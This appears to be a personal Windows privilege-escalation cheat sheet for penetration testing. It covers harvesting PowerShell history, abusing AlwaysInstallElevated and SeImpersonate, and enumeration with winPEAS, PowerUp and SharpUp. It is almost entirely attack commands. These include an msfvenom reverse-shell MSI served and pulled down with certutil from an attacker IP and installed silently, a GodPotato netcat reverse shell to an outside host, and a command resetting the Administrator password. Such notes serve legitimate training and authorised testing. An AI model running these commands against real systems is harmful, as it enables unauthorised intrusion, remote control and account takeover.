
# Quick Wins

## Powershell History

```cmd
# Powershell 5.0 in Windows 10, PowerShell stores command history to the file

# Checking Powershell History
PS C:\dotpirate> Get-History


# PowerShell v5, v5.1, and v7 is included

# Retrieve the history from PSReadline
PS C:\dotpirate> (Get-PSReadLineOption).HistorySavePath

PS C:\dotpirate> gc (Get-PSReadLineOption).HistorySavePath

type C:\Users\dotpirate\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

cat "C:\Users\dotpirate\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

## Always Installed Elevated

> Check if its enabled (if `0x1` appears we are good to go )
```cmd
PS C:\dotpirate> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
```cmd
PS C:\dotpirate> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Exploit it
```cmd
# Create a malicious .msi
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.137 LPORT=80 -a x64 --platform windows -f msi -o shell.msi

# Serve it 
python3 -m http.server 9090

# On Target
certutil -urlcache -f http://10.10.10.137/shell.msi shell.msi 

msiexec /quiet /qn /i shell.msi
```

## SeImporsonate Privilege

> Check if we have SeImpersonate

```cmd
whoami /priv
```


```cmd
# Check if it works
GodPotato -cmd "cmd /c whoami"


# Reverse Shell
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.49.116 80"

# If it does not work try change the Administrator password
GodPotato -cmd "cmd /c net user Administrator d0tpirate"
```
---

# Manual Enumeration

> Any other users on the machine?

```cmd
net user
```

> If there are other user's on the machine, check their groups, any of them have interesting groups?

```cmd
net user <username>
```

> What groups am I in?

```cmd
whoami /groups
```

> Any local services running on the machine?

```cmd
netstat -ano | findstr LISTENING

# If we want to check who (SYSTEM, USER) is ruinning a specific service
netstat -ano | findstr :8000

Get-WmiObject Win32_Process -Filter "ProcessId = 4" | ForEach-Object { $_.GetOwner() }


wmic process where processid=4 get ProcessID,Name,ExecutablePath,CSName,Description,Caption,Status /format:list

tasklist /fi "pid eq 1344"
```

> Any unusual or hidden directories in "C:/"?
> Any unusual or hidden files/directories in my user's home directory?

```cmd
cd ~
powershell.exe -ep bypass
gci -force
tree /F
```

---

# Automation

> I personaly use the following...

```cmd
.\winpeasx64.exe

. .\PowerUp.ps1
InvokeAllChecks

.\SharpUp.exe audit
```